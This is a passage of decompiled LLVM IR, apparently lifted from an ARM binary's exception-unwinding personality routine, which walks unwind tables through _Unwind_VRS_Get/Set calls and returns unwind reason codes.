  store i32 %v0_173f0, i32* %r0.global-to-local, align 4
  %v5_173fc = call i32 @_Unwind_VRS_Get(i32 %v0_173f0, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_173fc, i32* %r0.global-to-local, align 4
  %v3_17400 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_17400, i32* %r2.global-to-local, align 4
  %v0_17404 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_17404, %v3_17400
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_17410

._crit_edge:                                      ; preds = %bb152
  %v0_17428.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_17410:                               ; preds = %bb152
  %v0_17410 = load i32, i32* @r6, align 4
  %v1_17410 = and i32 %v0_17410, -2
  %v2_17414 = add i32 %v1_17410, %v0_17404
  %v3_17418 = icmp ult i32 %v3_17400, %v2_17414
  br i1 %v3_17418, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_17410
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_17410
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_17428 = phi i32 [ %v0_17428.pre, %._crit_edge ], [ %v0_17410, %bb153 ], [ %v0_17410, %.thread20 ]
  %v0_175d0 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_17424 = load i32, i32* @r5, align 4
  %v1_17428 = urem i32 %v0_17428, 2
  %v1_17424 = mul i32 %v0_17424, 2
  %v3_1742c = and i32 %v1_17424, 2
  %v4_1742c = or i32 %v3_1742c, %v1_17428
  store i32 %v4_1742c, i32* %r2.global-to-local, align 4
  %v7_17430 = icmp eq i32 %v4_1742c, 1
  br i1 %v7_17430, label %dec_label_pc_175c4, label %dec_label_pc_17438

dec_label_pc_17438:                               ; preds = %bb154
  %v2_17430 = icmp eq i32 %v4_1742c, 0
  br i1 %v2_17430, label %dec_label_pc_1743c, label %dec_label_pc_174ec

dec_label_pc_1743c:                               ; preds = %dec_label_pc_17438
  store i32 %v1_17344, i32* %r2.global-to-local, align 4
  br i1 %v2_17440, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_1743c
  %v0_17454119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_17454

bb155:                                            ; preds = %dec_label_pc_1743c
  %v2_1744c = icmp eq i32 %v0_175d0, 0
  %v0_17454 = load i32, i32* @r7, align 4
  br i1 %v2_1744c, label %dec_label_pc_17454, label %dec_label_pc_177cc

dec_label_pc_17454:                               ; preds = %.thread, %bb155
  %v0_17454120 = phi i32 [ %v0_17454119, %.thread ], [ %v0_17454, %bb155 ]
  %v1_17454 = add i32 %v0_17454120, 4
  %v1_17458 = inttoptr i32 %v1_17454 to i32*
  %v2_17458 = load i32, i32* %v1_17458, align 4
  %v2_1745c = icmp eq i32 %v2_17458, 0
  br i1 %v2_1745c, label %dec_label_pc_17464, label %dec_label_pc_173b0

dec_label_pc_17464:                               ; preds = %dec_label_pc_17678, %dec_label_pc_1763c, %dec_label_pc_17454, %dec_label_pc_173a4.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_173a4.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_17454 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_1763c ], [ %stack_var_-76.4, %dec_label_pc_17678 ]
  %v0_17464 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17464, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_1746c = call i32 @__gnu_unwind_execute(i32 %v0_17464, %anon_struct_13* %tmp156)
  store i32 %v4_1746c, i32* %r0.global-to-local, align 4
  store i32 %v4_1746c, i32* %r5.global-to-local, align 4
  %v2_17470 = icmp eq i32 %v4_1746c, 0
  br i1 %v2_17470, label %dec_label_pc_17478, label %dec_label_pc_174f4

dec_label_pc_17478:                               ; preds = %dec_label_pc_17464
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_1747c = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_1747c, label %bb157, label %dec_label_pc_17488

bb157:                                            ; preds = %dec_label_pc_17478
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174f8

dec_label_pc_17488:                               ; preds = %dec_label_pc_17478
  %v2_17488 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_17488, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_17498 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17498, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_174a0 = call i32 @_Unwind_VRS_Get(i32 %v0_17498, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_174a4 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_17498, i32* %r0.global-to-local, align 4
  %v5_174b8 = call i32 @_Unwind_VRS_Set(i32 %v0_17498, i32 %v0_174a4, i32 14, i32 %v0_174a4, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_174b8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r2.global-to-local, align 4
  %v4_174c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 32) to i32*), align 4
  %v0_174c8 = load i32, i32* %r5.global-to-local, align 4
  %v0_174cc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_174cc, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_174c4, i32* %stack_var_-48, align 4
  %v5_174e0 = call i32 @_Unwind_VRS_Set(i32 %v0_174cc, i32 %v0_174c8, i32 15, i32 %v0_174c8, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174f8

dec_label_pc_174ec:                               ; preds = %dec_label_pc_17438
  %v7_174ec = icmp eq i32 %v4_1742c, 2
  br i1 %v7_174ec, label %dec_label_pc_17504, label %dec_label_pc_174f4

dec_label_pc_174f4:                               ; preds = %dec_label_pc_174ec, %dec_label_pc_175d8, %dec_label_pc_17464, %dec_label_pc_177cc
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174f8

dec_label_pc_174f8:                               ; preds = %bb157, %dec_label_pc_17804, %dec_label_pc_17794, %bb166, %dec_label_pc_17488, %dec_label_pc_174f4
  %v1_17500 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_17804 ], [ %v1_17500.pre, %dec_label_pc_17794 ], [ 7, %bb166 ], [ 7, %dec_label_pc_17488 ], [ 9, %dec_label_pc_174f4 ]
  store i32 %v3_17314, i32* %r4.global-to-local, align 4
  store i32 %v6_17314, i32* %r5.global-to-local, align 4
  ret i32 %v1_17500

dec_label_pc_17504:                               ; preds = %dec_label_pc_174ec
  store i32 %v1_17344, i32* %r2.global-to-local, align 4
  %v0_17508 = load i32, i32* @r7, align 4
  %v1_17508 = inttoptr i32 %v0_17508 to i32*
  %v2_17508 = load i32, i32* %v1_17508, align 4
  %tmp206 = bitcast i32 %v2_17508 to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_17510 = bitcast float %tmp207 to i32
  store i32 %v1_17510, i32* @sl, align 4
  br i1 %v2_17440, label %dec_label_pc_17518, label %dec_label_pc_17684

dec_label_pc_17518:                               ; preds = %dec_label_pc_17504
  %v2_17518 = icmp eq i32 %v0_175d0, 0
  br i1 %v2_17518, label %dec_label_pc_1766c, label %dec_label_pc_17520

dec_label_pc_17520:                               ; preds = %dec_label_pc_17518
  %v2_17524 = icmp eq i32 %v1_17510, 0
  br i1 %v2_17524, label %dec_label_pc_17530.thread, label %bb159

dec_label_pc_17530.thread:                        ; preds = %dec_label_pc_17520
  br label %dec_label_pc_17794

bb159:                                            ; preds = %dec_label_pc_17520
  br i1 %v3_17528, label %dec_label_pc_17538, label %dec_label_pc_1766c

dec_label_pc_17538:                               ; preds = %bb159
  %v1_17538 = add i32 %v0_17508, 4
  store i32 %v1_17538, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_17548 = load i32, i32* @r8, align 4
  %v1_17548 = add i32 %v0_17548, 88
  store i32 %v1_17548, i32* %sb.global-to-local, align 4
  store i32 %v1_17538, i32* @r4, align 4
  br label %dec_label_pc_1756c

dec_label_pc_1755c:                               ; preds = %bb161
  %v1_1755c = add i32 %v0_1755c, 1
  store i32 %v1_1755c, i32* @r5, align 4
  %v1_17560 = load i32, i32* @sl, align 4
  %v9_17560 = icmp eq i32 %v1_1755c, %v1_17560
  %v0_17564 = load i32, i32* @r4, align 4
  %v1_17564 = add i32 %v0_17564, 4
  store i32 %v1_17564, i32* @r4, align 4
  br i1 %v9_17560, label %dec_label_pc_17794, label %dec_label_pc_1755c.dec_label_pc_1756c_crit_edge

dec_label_pc_1755c.dec_label_pc_1756c_crit_edge:  ; preds = %dec_label_pc_1755c
  %v0_17578.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1756c

dec_label_pc_1756c:                               ; preds = %dec_label_pc_1755c.dec_label_pc_1756c_crit_edge, %dec_label_pc_17538
  %v0_17578 = phi i32 [ %v0_17578.pre, %dec_label_pc_1755c.dec_label_pc_1756c_crit_edge ], [ %v1_17548, %dec_label_pc_17538 ]
  %v1_1757c = phi i32 [ %v1_17564, %dec_label_pc_1755c.dec_label_pc_1756c_crit_edge ], [ %v1_17538, %dec_label_pc_17538 ]
  %v1_1756c = inttoptr i32 %v1_1757c to i32*
  %v2_1756c = load i32, i32* %v1_1756c, align 4
  %v2_17570 = icmp eq i32 %v2_1756c, 0
  store i32 %v0_17578, i32* %forced_unwind_-44, align 4
  br i1 %v2_17570, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_1756c
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_1756c, %bb160
  %v0_17580 = load i32, i32* @r8, align 4
  store i32 %v0_17580, i32* %r0.global-to-local, align 4
  store i32 %v2_1760c, i32* %r2.global-to-local, align 4
  %v4_17590 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 100) to i32*), align 4
  store i32 95644, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17590)
  %v0_1759c = load i32, i32* %r0.global-to-local, align 4
  %v2_1759c = icmp eq i32 %v0_1759c, 0
  %v0_1755c = load i32, i32* @r5, align 4
  br i1 %v2_1759c, label %dec_label_pc_1755c, label %dec_label_pc_175a4

dec_label_pc_175a4:                               ; preds = %bb161
  %v1_175a4 = load i32, i32* @sl, align 4
  %v9_175a4 = icmp eq i32 %v0_1755c, %v1_175a4
  br i1 %v9_175a4, label %dec_label_pc_17794, label %dec_label_pc_175ac

dec_label_pc_175ac:                               ; preds = %dec_label_pc_175a4
  %v0_175ac = load i32, i32* @r7, align 4
  %v1_175ac = inttoptr i32 %v0_175ac to i32*
  %v2_175ac = load i32, i32* %v1_175ac, align 4
  %v1_175b0 = icmp slt i32 %v2_175ac, 0
  %v0_175b8.pre = load i32, i32* @r6, align 4
  br i1 %v1_175b0, label %dec_label_pc_175b8, label %dec_label_pc_17678

dec_label_pc_175b8:                               ; preds = %dec_label_pc_175ac, %dec_label_pc_17670
  %v0_175b8 = phi i32 [ %storemerge, %dec_label_pc_17670 ], [ %v0_175b8.pre, %dec_label_pc_175ac ]
  store i32 %v0_175b8, i32* %r0.global-to-local, align 4
  %v1_175bc = add i32 %v0_175b8, 4
  store i32 %v1_175bc, i32* @r6, align 4
  br label %dec_label_pc_17678

dec_label_pc_175c4:                               ; preds = %bb154
  store i32 %v1_17344, i32* %r2.global-to-local, align 4
  br i1 %v2_17440, label %dec_label_pc_175d0, label %dec_label_pc_176bc

dec_label_pc_175d0:                               ; preds = %dec_label_pc_175c4
  %v2_175d0 = icmp eq i32 %v0_175d0, 0
  br i1 %v2_175d0, label %dec_label_pc_1763c, label %dec_label_pc_175d8

dec_label_pc_175d8:                               ; preds = %dec_label_pc_175d0
  %v0_175d8 = load i32, i32* @r7, align 4
  %v1_175d8 = add i32 %v0_175d8, 4
  %v2_175d8 = inttoptr i32 %v1_175d8 to i32*
  %v3_175d8 = load i32, i32* %v2_175d8, align 4
  %v7_175dc = icmp eq i32 %v3_175d8, -2
  store i32 %v1_175d8, i32* %r2.global-to-local, align 4
  br i1 %v7_175dc, label %dec_label_pc_174f4, label %dec_label_pc_175e8

dec_label_pc_175e8:                               ; preds = %dec_label_pc_175d8
  %v0_175e8 = load i32, i32* @r8, align 4
  %v1_175e8 = add i32 %v0_175e8, 88
  %v7_175ec = icmp eq i32 %v3_175d8, -1
  store i32 %v1_175e8, i32* %forced_unwind_-44, align 4
  br i1 %v7_175ec, label %dec_label_pc_17630, label %dec_label_pc_175f8

dec_label_pc_175f8:                               ; preds = %dec_label_pc_175e8
  %v2_175fc = icmp eq i32 %v3_175d8, 0
  br i1 %v2_175fc, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_175f8
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_175f8, %bb162
  store i32 %v0_175e8, i32* %r0.global-to-local, align 4
  store i32 %v2_1760c, i32* %r2.global-to-local, align 4
  %v4_17618 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 100) to i32*), align 4
  store i32 95780, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17618)
  %v0_17624 = load i32, i32* %r0.global-to-local, align 4
  %v2_17624 = icmp eq i32 %v0_17624, 0
  br i1 %v2_17624, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_17630.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_17630

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_1763c

dec_label_pc_17630:                               ; preds = %.thread25, %dec_label_pc_175e8
  %v3_17630 = phi i32 [ %v3_17630.pr, %.thread25 ], [ %v1_175e8, %dec_label_pc_175e8 ]
  %v2_17634 = icmp eq i32 %v3_17630, 0
  br i1 %v2_17634, label %dec_label_pc_1763c, label %dec_label_pc_17794

dec_label_pc_1763c:                               ; preds = %bb164, %dec_label_pc_176e8, %dec_label_pc_176bc, %dec_label_pc_17630, %dec_label_pc_175d0
  %v0_1763c = load i32, i32* @r7, align 4
  %v1_1763c = add i32 %v0_1763c, 8
  %v1_173a4 = inttoptr i32 %v1_1763c to i32*
  %v2_173a4 = load i32, i32* %v1_173a4, align 4
  %v2_173a8 = icmp eq i32 %v2_173a4, 0
  br i1 %v2_173a8, label %dec_label_pc_17464, label %dec_label_pc_173b0.preheader

dec_label_pc_17644:                               ; preds = %entry
  %v3_17644 = udiv i32 %v2_17338, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_17654 = mul nuw nsw i32 %v3_17644, 4
  %v3_17658 = mul i32 %v2_17338, 65536
  %v2_1765c = add i32 %v6_17654, %v4_17338
  store i32 %v3_17658, i32* %v4_17358, align 8
  br label %dec_label_pc_17380

dec_label_pc_1766c:                               ; preds = %bb159, %dec_label_pc_17518
  %v1_1766c = add i32 %v0_17508, 4
  br label %dec_label_pc_17670

dec_label_pc_17670:                               ; preds = %dec_label_pc_176b0, %dec_label_pc_1766c
  %v0_17670 = phi i32 [ %v2_176b0, %dec_label_pc_176b0 ], [ %v2_17508, %dec_label_pc_1766c ]
  %storemerge = phi i32 [ %v4_176b0, %dec_label_pc_176b0 ], [ %v1_1766c, %dec_label_pc_1766c ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_17670 = icmp slt i32 %v0_17670, 0
  br i1 %v1_17670, label %dec_label_pc_175b8, label %dec_label_pc_17678

dec_label_pc_17678:                               ; preds = %dec_label_pc_175ac, %dec_label_pc_17670, %dec_label_pc_17784, %dec_label_pc_175b8
  %v0_1767c = phi i32 [ %v1_175bc, %dec_label_pc_175b8 ], [ %storemerge, %dec_label_pc_17670 ], [ %v1_17788, %dec_label_pc_17784 ], [ %v0_175b8.pre, %dec_label_pc_175ac ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_175b8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_17670 ], [ %v1_17784, %dec_label_pc_17784 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_175ac ]
  %v0_17678 = load i32, i32* @sl, align 4
  %v3_17678 = mul i32 %v0_17678, 4
  %v2_1767c = add i32 %v3_17678, %v0_1767c
  %v1_173a465 = inttoptr i32 %v2_1767c to i32*
  %v2_173a466 = load i32, i32* %v1_173a465, align 4
  %v2_173a868 = icmp eq i32 %v2_173a466, 0
  br i1 %v2_173a868, label %dec_label_pc_17464, label %dec_label_pc_173b0.preheader.lr.ph

dec_label_pc_17684:                               ; preds = %dec_label_pc_17504
  %v0_17694 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17694, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_1769c = load i32, i32* @r8, align 4
  %v1_1769c = add i32 %v0_1769c, 32
  %v2_1769c = inttoptr i32 %v1_1769c to i32*
  %v3_1769c = load i32, i32* %v2_1769c, align 4
  store i32 %v3_1769c, i32* @r4, align 4
  %v5_176a0 = call i32 @_Unwind_VRS_Get(i32 %v0_17694, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_176a0, i32* %r0.global-to-local, align 4
  %v3_176a4 = load i32, i32* %stack_var_-48, align 4
  %v0_176a8 = load i32, i32* @r4, align 4
  %v9_176a8 = icmp eq i32 %v0_176a8, %v3_176a4
  br i1 %v9_176a8, label %dec_label_pc_17750, label %dec_label_pc_17684.dec_label_pc_176b0_crit_edge

dec_label_pc_17684.dec_label_pc_176b0_crit_edge:  ; preds = %dec_label_pc_17684
  %v0_176b0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_176b0

dec_label_pc_176b0:                               ; preds = %dec_label_pc_17684.dec_label_pc_176b0_crit_edge, %dec_label_pc_17750
  %v0_176b0 = phi i32 [ %v0_176b0.pre, %dec_label_pc_17684.dec_label_pc_176b0_crit_edge ], [ %v1_17754, %dec_label_pc_17750 ]
  %v1_176b0 = inttoptr i32 %v0_176b0 to i32*
  %v2_176b0 = load i32, i32* %v1_176b0, align 4
  %v4_176b0 = add i32 %v0_176b0, 4
  store i32 %v4_176b0, i32* @r7, align 4
  br label %dec_label_pc_17670

dec_label_pc_176bc:                               ; preds = %dec_label_pc_175c4
  %v0_176cc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_176cc, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_176d4 = load i32, i32* @r8, align 4
  %v1_176d4 = add i32 %v0_176d4, 32
  %v2_176d4 = inttoptr i32 %v1_176d4 to i32*
  %v3_176d4 = load i32, i32* %v2_176d4, align 4
  store i32 %v3_176d4, i32* @r4, align 4
  %v5_176d8 = call i32 @_Unwind_VRS_Get(i32 %v0_176cc, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_176d8, i32* %r0.global-to-local, align 4
  %v3_176dc = load i32, i32* %stack_var_-48, align 4
  %v0_176e0 = load i32, i32* @r4, align 4
  %v9_176e0 = icmp eq i32 %v0_176e0, %v3_176dc
  br i1 %v9_176e0, label %dec_label_pc_176e8, label %dec_label_pc_1763c

dec_label_pc_176e8:                               ; preds = %dec_label_pc_176bc
  %v0_176e8 = load i32, i32* @r8, align 4
  %v1_176e8 = add i32 %v0_176e8, 40
  %v2_176e8 = inttoptr i32 %v1_176e8 to i32*
  %v3_176e8 = load i32, i32* %v2_176e8, align 4
  %v1_176ec = load i32, i32* @r7, align 4
  %v9_176ec = icmp eq i32 %v3_176e8, %v1_176ec
  br i1 %v9_176ec, label %dec_label_pc_176f4, label %dec_label_pc_1763c

dec_label_pc_176f4:                               ; preds = %dec_label_pc_176e8
  %v1_176f4 = inttoptr i32 %v3_176e8 to i32*
  %v2_176f4 = load i32, i32* %v1_176f4, align 4
  %v1_176f8 = and i32 %v2_176f4, 1073741824
  %v2_176f8 = icmp eq i32 %v1_176f8, 0
  br i1 %v2_176f8, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_176f4
  %v2_176fc = or i32 %v2_176f4, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_176f4
  %tmp208 = bitcast i32 %v2_176f4 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_17700 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_17704 = phi i32 [ %v2_17834, %.thread28 ], [ %v2_17834, %bb169 ], [ %v3_176e8, %bb165 ], [ %v3_176e8, %.thread26 ]
  %v0_17704 = phi i32 [ %v2_17844, %.thread28 ], [ %v2_17840, %bb169 ], [ %v2_176fc, %bb165 ], [ %v2_17700, %.thread26 ]
  %v2_17704 = add i32 %v0_17704, %v1_17704
  store i32 %v2_17704, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_1771c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1771c, i32* %r0.global-to-local, align 4
  %v5_17724 = call i32 @_Unwind_VRS_Set(i32 %v0_1771c, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_1771c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1773c = load i32, i32* @r8, align 4
  store i32 %v0_1773c, i32* %stack_var_-48, align 4
  %v5_17744 = call i32 @_Unwind_VRS_Set(i32 %v0_1771c, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174f8

dec_label_pc_17750:                               ; preds = %dec_label_pc_17684
  %v0_17750 = load i32, i32* @r8, align 4
  %v1_17750 = add i32 %v0_17750, 40
  %v2_17750 = inttoptr i32 %v1_17750 to i32*
  %v3_17750 = load i32, i32* %v2_17750, align 4
  %v1_17754 = load i32, i32* @r7, align 4
  %v9_17754 = icmp eq i32 %v3_17750, %v1_17754
  br i1 %v9_17754, label %dec_label_pc_1775c, label %dec_label_pc_176b0

dec_label_pc_1775c:                               ; preds = %dec_label_pc_17750
  %v1_17760 = add i32 %v3_17750, 4
  store i32 %v1_17760, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_17768 = add i32 %v0_17750, 44
  %v3_17768 = inttoptr i32 %v2_17768 to i32*
  store i32 0, i32* %v3_17768, align 4
  %v0_1776c = load i32, i32* %r2.global-to-local, align 4
  %v1_1776c = load i32, i32* @r8, align 4
  %v2_1776c = add i32 %v1_1776c, 48
  %v3_1776c = inttoptr i32 %v2_1776c to i32*
  store i32 %v0_1776c, i32* %v3_1776c, align 4
  %v0_17770 = load i32, i32* @sl, align 4
  %v1_17770 = load i32, i32* @r8, align 4
  %v2_17770 = add i32 %v1_17770, 40
  %v3_17770 = inttoptr i32 %v2_17770 to i32*
  store i32 %v0_17770, i32* %v3_17770, align 4
  %v0_17774 = load i32, i32* %r0.global-to-local, align 4
  %v1_17774 = load i32, i32* @r8, align 4
  %v2_17774 = add i32 %v1_17774, 52
  %v3_17774 = inttoptr i32 %v2_17774 to i32*
  store i32 %v0_17774, i32* %v3_17774, align 4
  %v0_17778 = load i32, i32* @r7, align 4
  %v1_17778 = inttoptr i32 %v0_17778 to i32*
  %v2_17778 = load i32, i32* %v1_17778, align 4
  %v1_1777c = icmp slt i32 %v2_17778, 0
  br i1 %v1_1777c, label %dec_label_pc_17784, label %dec_label_pc_17830

dec_label_pc_17784:                               ; preds = %dec_label_pc_1775c
  %v0_17784 = load i32, i32* %r2.global-to-local, align 4
  %v1_17784 = add i32 %v0_17784, -3
  store i32 %v1_17784, i32* %r2.global-to-local, align 4
  %v0_17788 = load i32, i32* %r0.global-to-local, align 4
  %v1_17788 = add i32 %v0_17788, 4
  store i32 %v1_17788, i32* @r6, align 4
  br label %dec_label_pc_17678

dec_label_pc_17794:                               ; preds = %dec_label_pc_175a4, %dec_label_pc_17630, %dec_label_pc_1755c, %dec_label_pc_17530.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_177a4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_177a4, i32* %r0.global-to-local, align 4
  %v5_177ac = call i32 @_Unwind_VRS_Get(i32 %v0_177a4, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_177b0 = load i32, i32* @r7, align 4
  %v1_177b0 = load i32, i32* @r8, align 4
  %v2_177b0 = add i32 %v1_177b0, 40
  %v3_177b0 = inttoptr i32 %v2_177b0 to i32*
  store i32 %v0_177b0, i32* %v3_177b0, align 4
  %v3_177b4 = load i32, i32* %stack_var_-48, align 4
  %v3_177b8 = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_177b8, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_177c0 = load i32, i32* @r8, align 4
  %v2_177c0 = add i32 %v1_177c0, 32
  %v3_177c0 = inttoptr i32 %v2_177c0 to i32*
  store i32 %v3_177b4, i32* %v3_177c0, align 4
  %v0_177c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_177c4 = load i32, i32* @r8, align 4
  %v2_177c4 = add i32 %v1_177c4, 36
  %v3_177c4 = inttoptr i32 %v2_177c4 to i32*
  store i32 %v0_177c4, i32* %v3_177c4, align 4
  %v1_17500.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174f8

dec_label_pc_177cc:                               ; preds = %bb155
  %v1_177cc = inttoptr i32 %v0_17454 to i32*
  %v2_177cc = load i32, i32* %v1_177cc, align 4
  %v1_177d0 = add i32 %v0_17454, 4
  %v1_177d4 = and i32 %v2_177cc, 1073741824
  %v2_177d4 = icmp eq i32 %v1_177d4, 0
  %v2_177d8 = or i32 %v2_177cc, -2147483648
  %tmp210 = bitcast i32 %v2_177cc to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_177dc = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_177d4, i32 %v2_177dc, i32 %v2_177d8
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_177e0 = load i32, i32* @r8, align 4
  %v2_177e0 = add i32 %v1_177e0, 56
  %v3_177e0 = inttoptr i32 %v2_177e0 to i32*
  store i32 %v1_177d0, i32* %v3_177e0, align 4
  %v0_177e4 = load i32, i32* @r8, align 4
  store i32 %v0_177e4, i32* %r0.global-to-local, align 4
  %v4_177f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 28) to i32*), align 4
  store i32 96252, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_177f0)
  %v0_177fc = load i32, i32* %r0.global-to-local, align 4
  %v2_177fc = icmp eq i32 %v0_177fc, 0
  br i1 %v2_177fc, label %dec_label_pc_174f4, label %dec_label_pc_17804

dec_label_pc_17804:                               ; preds = %dec_label_pc_177cc
  %v0_17804 = load i32, i32* %r4.global-to-local, align 4
  %v1_17804 = load i32, i32* @r7, align 4
  %v2_17804 = add i32 %v1_17804, %v0_17804
  store i32 %v2_17804, i32* %stack_var_-48, align 4
  %v0_17814 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_17814, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_17824 = call i32 @_Unwind_VRS_Set(i32 %v0_17814, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_174f8

dec_label_pc_17830:                               ; preds = %dec_label_pc_1775c
  %v0_17830 = load i32, i32* @sl, align 4
  %v3_17830 = mul i32 %v0_17830, 4
  %v0_17834 = load i32, i32* %r0.global-to-local, align 4
  %v2_17834 = add i32 %v0_17834, %v3_17830
  %v3_17834 = inttoptr i32 %v2_17834 to i32*
  %v4_17834 = load i32, i32* %v3_17834, align 4
  %v1_17838 = and i32 %v4_17834, 1073741824
  %v2_17838 = icmp eq i32 %v1_17838, 0
  br i1 %v2_17838, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_17830
  %v2_17840 = or i32 %v4_17834, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_17830
  %tmp212 = bitcast i32 %v4_17834 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_17844 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_17834, { 2, 1, 0 }
  uselistorder i32 %v1_17788, { 1, 0 }
  uselistorder i32 %v1_17784, { 1, 0 }
  uselistorder i32 %v1_17754, { 1, 0 }
  uselistorder i32 %v0_1771c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_176e8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_176b0, { 1, 0 }
  uselistorder i32 %v0_176b0, { 1, 0 }
  uselistorder i32 %v2_173a466, { 1, 0 }
  uselistorder i32 %v2_1767c, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_173a4, { 1, 0 }
  uselistorder i32 %v1_1763c, { 1, 0 }
  uselistorder i32 %v3_175d8, { 2, 0, 1 }
  uselistorder i32 %v0_175b8, { 1, 0 }
  uselistorder i32 %v0_175b8.pre, { 1, 0 }
